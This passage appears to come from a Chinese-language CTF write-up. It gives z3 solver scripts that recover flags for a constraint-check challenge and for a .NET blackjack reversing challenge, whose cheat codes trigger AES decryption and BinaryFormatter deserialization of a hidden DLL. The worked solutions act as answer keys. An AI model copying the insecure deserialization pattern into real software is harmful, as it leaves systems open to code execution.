</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">248858</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">262669</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">67895</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">111771</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">132193</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">141512</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">139406</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">27</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">109646</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">286309</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">175476</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">138067</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">192825</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">25</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">199577</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">63091</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">285207</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">26</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">58820340</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">28</span>):
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(a1[i] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(a1[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7f</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(a1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;f&#39;</span>))
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(a1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;l&#39;</span>))
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(a1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(a1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;g&#39;</span>))
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(a1[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;{&#39;</span>))
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(a1[<span style="color:#ae81ff">27</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;}&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con6 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con7 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con9 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con10 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con11 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con12 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con13 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con15 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con16 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con17 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con19 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con20 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con21 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con22 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con23 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con24 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con25 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con26 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con27 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con28 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con29 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con30 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(con31 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> sat <span style="color:#f92672">==</span> s<span style="color:#f92672">.</span>check():
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a1:
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">+=</span> chr(m[i]<span style="color:#f92672">.</span>as_long())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hl <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5()
</span></span><span style="display:flex;"><span>hl<span style="color:#f92672">.</span>update(flag<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>print (hl<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;042905954c2c27f21bd74489ea0d151f&#39;</span>)
</span></span><span style="display:flex;"><span>print (flag)
</span></span></code></pre></div><h3 id="gamemaster">GameMaster</h3>
<p>.net逆向</p>
<p>一个21点游戏，逆向发现存在作弊码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (memcmp1(input, <span style="color:#e6db74">&#34;MF3K&#34;</span>, <span style="color:#ae81ff">4</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        game.Player.Bet -= <span style="color:#ae81ff">22</span>m;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; memory.Length; i++) {
</span></span><span style="display:flex;"><span>            memory[i] ^= <span style="color:#ae81ff">34</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        Environment.SetEnvironmentVariable(<span style="color:#e6db74">&#34;AchivePoint1&#34;</span>, game.Player.Balance.ToString());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (memcmp1(input, <span style="color:#e6db74">&#34;EEPW&#34;</span>, <span style="color:#ae81ff">4</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        game.Player.Balance += <span style="color:#ae81ff">175</span>m;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span>[] key = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">109</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">33</span>
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>        RijndaelManaged rijndaelManaged = <span style="color:#66d9ef">new</span> RijndaelManaged();
</span></span><span style="display:flex;"><span>        rijndaelManaged.Key = key;
</span></span><span style="display:flex;"><span>        rijndaelManaged.Mode = CipherMode.ECB;
</span></span><span style="display:flex;"><span>        rijndaelManaged.Padding = PaddingMode.Zeros;
</span></span><span style="display:flex;"><span>        ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
</span></span><span style="display:flex;"><span>        m = cryptoTransform.TransformFinalBlock(memory, <span style="color:#ae81ff">0</span>, memory.Length);
</span></span><span style="display:flex;"><span>        Environment.SetEnvironmentVariable(<span style="color:#e6db74">&#34;AchivePoint2&#34;</span>, game.Player.Balance.ToString());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (memcmp1(input, <span style="color:#e6db74">&#34;6VD6&#34;</span>, <span style="color:#ae81ff">4</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        game.Player.Balance -= <span style="color:#ae81ff">27</span>m;
</span></span><span style="display:flex;"><span>        Environment.SetEnvironmentVariable(<span style="color:#e6db74">&#34;AchivePoint3&#34;</span>, game.Player.Balance.ToString());
</span></span><span style="display:flex;"><span>        BinaryFormatter binaryFormatter = <span style="color:#66d9ef">new</span> BinaryFormatter();
</span></span><span style="display:flex;"><span>        MemoryStream serializationStream = <span style="color:#66d9ef">new</span> MemoryStream(m);
</span></span><span style="display:flex;"><span>        binaryFormatter.Deserialize(serializationStream);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>依次触发三个作弊码，就会对文件内容进行解密并反序列化</p>
<p>解密后发现序列化内容中包含了一个dll文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Check1(<span style="color:#66d9ef">ulong</span> x, <span style="color:#66d9ef">ulong</span> y, <span style="color:#66d9ef">ulong</span> z, <span style="color:#66d9ef">byte</span>[] KeyStream)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num = -<span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">320</span>; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        x = (((x &gt;&gt; <span style="color:#ae81ff">29</span> ^ x &gt;&gt; <span style="color:#ae81ff">28</span> ^ x &gt;&gt; <span style="color:#ae81ff">25</span> ^ x &gt;&gt; <span style="color:#ae81ff">23</span>) &amp; <span style="color:#ae81ff">1</span>UL) | x &lt;&lt; <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        y = (((y &gt;&gt; <span style="color:#ae81ff">30</span> ^ y &gt;&gt; <span style="color:#ae81ff">27</span>) &amp; <span style="color:#ae81ff">1</span>UL) | y &lt;&lt; <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        z = (((z &gt;&gt; <span style="color:#ae81ff">31</span> ^ z &gt;&gt; <span style="color:#ae81ff">30</span> ^ z &gt;&gt; <span style="color:#ae81ff">29</span> ^ z &gt;&gt; <span style="color:#ae81ff">28</span> ^ z &gt;&gt; <span style="color:#ae81ff">26</span> ^ z &gt;&gt; <span style="color:#ae81ff">24</span>) &amp; <span style="color:#ae81ff">1</span>UL) | z &lt;&lt; <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">bool</span> flag = i % <span style="color:#ae81ff">8</span> == <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (flag)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            num++;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        KeyStream[num] = (<span style="color:#66d9ef">byte</span>)((<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">long</span>)KeyStream[num] &lt;&lt; <span style="color:#ae81ff">1</span>) | (<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">ulong</span>)((<span style="color:#66d9ef">uint</span>)((z &gt;&gt; <span style="color:#ae81ff">32</span> &amp; <span style="color:#ae81ff">1</span>UL &amp; (x &gt;&gt; <span style="color:#ae81ff">30</span> &amp; <span style="color:#ae81ff">1</span>UL)) ^ (((z &gt;&gt; <span style="color:#ae81ff">32</span> &amp; <span style="color:#ae81ff">1</span>UL) ^ <span style="color:#ae81ff">1</span>UL) &amp; (y &gt;&gt; <span style="color:#ae81ff">31</span> &amp; <span style="color:#ae81ff">1</span>UL))))));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> ParseKey(<span style="color:#66d9ef">ulong</span>[] L, <span style="color:#66d9ef">byte</span>[] Key)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">3</span>; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; <span style="color:#ae81ff">4</span>; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            Key[i * <span style="color:#ae81ff">4</span> + j] = (<span style="color:#66d9ef">byte</span>)(L[i] &gt;&gt; j * <span style="color:#ae81ff">8</span> &amp; <span style="color:#ae81ff">255</span>UL);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> T1()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">string</span> environmentVariable = Environment.GetEnvironmentVariable(<span style="color:#e6db74">&#34;AchivePoint1&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">string</span> environmentVariable2 = Environment.GetEnvironmentVariable(<span style="color:#e6db74">&#34;AchivePoint2&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">string</span> environmentVariable3 = Environment.GetEnvironmentVariable(<span style="color:#e6db74">&#34;AchivePoint3&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">bool</span> flag = environmentVariable == <span style="color:#66d9ef">null</span> || environmentVariable2 == <span style="color:#66d9ef">null</span> || environmentVariable3 == <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (!flag)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ulong</span> num = <span style="color:#66d9ef">ulong</span>.Parse(environmentVariable);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ulong</span> num2 = <span style="color:#66d9ef">ulong</span>.Parse(environmentVariable2);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ulong</span> num3 = <span style="color:#66d9ef">ulong</span>.Parse(environmentVariable3);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ulong</span>[] array = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">ulong</span>[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">40</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] array3 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">40</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] array4 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">12</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] first = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] { 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">38</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">183</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">37</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">5</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] array5 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] {
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">108</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">62</span>, 
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">227</span>
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            array[<span style="color:#ae81ff">0</span>] = num;
</span></span><span style="display:flex;"><span>            array[<span style="color:#ae81ff">1</span>] = num2;
</span></span><span style="display:flex;"><span>            array[<span style="color:#ae81ff">2</span>] = num3;
</span></span><span style="display:flex;"><span>            T1.Check1(array[<span style="color:#ae81ff">0</span>], array[<span style="color:#ae81ff">1</span>], array[<span style="color:#ae81ff">2</span>], array2);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">bool</span> flag2 = first.SequenceEqual(array2);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (flag2)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                T1.ParseKey(array, array4);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; array5.Length; i++)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    array5[i] ^= array4[i % array4.Length];
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                MessageBox.Show(<span style="color:#e6db74">&#34;flag{&#34;</span> + Encoding.Default.GetString(array5) + <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#e6db74">&#34;Congratulations!&#34;</span>, MessageBoxButtons.OK);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (Exception)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>使用 z3 求解三个环境变量</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>z <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;z&#39;</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag1 <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">173</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">106</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">5</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">320</span>):
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> (((x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">29</span> <span style="color:#f92672">^</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span> <span style="color:#f92672">^</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">25</span> <span style="color:#f92672">^</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">23</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> x <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)
